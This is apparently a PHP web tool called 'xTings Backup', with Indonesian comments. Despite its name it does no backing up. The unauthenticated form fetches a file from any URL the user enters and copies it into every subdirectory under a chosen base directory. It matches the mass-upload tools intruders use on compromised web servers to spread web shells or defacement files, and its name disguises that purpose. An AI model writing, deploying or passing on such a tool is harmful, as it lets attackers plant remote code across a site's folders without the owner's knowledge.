<?php
// Inisialisasi array pesan hasil
$results = [];

if (isset($_POST['submit'])) {
    // Ambil input dari form
    $url = trim($_POST['file_url']);
    $baseDir = trim($_POST['base_directory']);

    // Validasi URL
    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
        $results[] = "URL tidak valid.";
    } elseif (!is_dir($baseDir)) {
        $results[] = "Direktori dasar tidak ditemukan.";
    } else {
        // Dapatkan nama file dari URL
        $fileName = basename(parse_url($url, PHP_URL_PATH));

        // Tentukan lokasi file sementara (temp file)
        $tempFile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $fileName;

        // Fungsi untuk mendownload file menggunakan cURL
        function downloadFileOnce($url, $savePath) {
            $ch = curl_init($url);
            $fp = fopen($savePath, 'w');
            if (!$fp) {
                return "Tidak dapat membuka file untuk menulis: $savePath";
            }
            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
            curl_exec($ch);
            if (curl_errno($ch)) {
                $error = curl_error($ch);
                curl_close($ch);
                fclose($fp);
                return "Error mendownload ke $savePath: $error";
            }
            curl_close($ch);
            fclose($fp);
            return "File berhasil didownload ke: $savePath";
        }

        // Download file sekali dan simpan di file sementara
        $downloadResult = downloadFileOnce($url, $tempFile);
        $results[] = $downloadResult;

        // Jika file sementara ada, copy file ke setiap folder di dalam baseDir secara rekursif
        if (file_exists($tempFile)) {
            // Dapatkan semua folder di dalam baseDir menggunakan RecursiveIterator
            $directories = [];
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($baseDir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iterator as $item) {
                if ($item->isDir()) {
                    $directories[] = $item->getPathname();
                }
            }
            // Tambahkan juga direktori dasar itu sendiri
            $directories[] = $baseDir;

            // Lakukan penyalinan file ke masing-masing folder
            foreach ($directories as $dir) {
                $destination = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
                if (copy($tempFile, $destination)) {
                    $results[] = "File berhasil disalin ke: $destination";
                } else {
                    $results[] = "Gagal menyalin file ke: $destination";
                }
            }
        }

        // Hapus file sementara
        if (file_exists($tempFile)) {
            unlink($tempFile);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xTings Backup</title>
    <!-- Bootstrap CSS CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
       body {
           background-color: #f8f9fa;
       }
       .container {
           margin-top: 50px;
       }
    </style>
</head>
<body>
<div class="container">
    <div class="row justify-content-center">
       <div class="col-md-8">
          <div class="card shadow-sm">
             <div class="card-header bg-primary text-white">
                 <h4 class="card-title mb-0">xTings Backup</h4>
             </div>
             <div class="card-body">
                 <form method="post" action="">
                     <div class="mb-3">
                         <label for="file_url" class="form-label">File URL</label>
                         <input type="text" name="file_url" id="file_url" class="form-control" required
                                value="<?php echo isset($_POST['file_url']) ? htmlspecialchars($_POST['file_url']) : 'Masukan file URL yang ingin didownload'; ?>">
                     </div>
                     <div class="mb-3">
                         <label for="base_directory" class="form-label">Base Directory</label>
                         <input type="text" name="base_directory" id="base_directory" class="form-control" required
                                value="<?php echo isset($_POST['base_directory']) ? htmlspecialchars($_POST['base_directory']) : 'Masukan Lokasi Directory'; ?>">
                     </div>
                     <button type="submit" name="submit" class="btn btn-primary w-100">Download &amp; Copy File</button>
                 </form>
             </div>
          </div>
          <?php if (!empty($results)): ?>
              <div class="card mt-3">
                  <div class="card-header">
                      <h5 class="card-title mb-0">Hasil</h5>
                  </div>
                  <div class="card-body">
                      <ul class="list-group list-group-flush">
                          <?php foreach ($results as $msg): ?>
                              <li class="list-group-item"><?php echo htmlspecialchars($msg); ?></li>
                          <?php endforeach; ?>
                      </ul>
                  </div>
              </div>
          <?php endif; ?>
       </div>
    </div>
</div>

<!-- Bootstrap Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
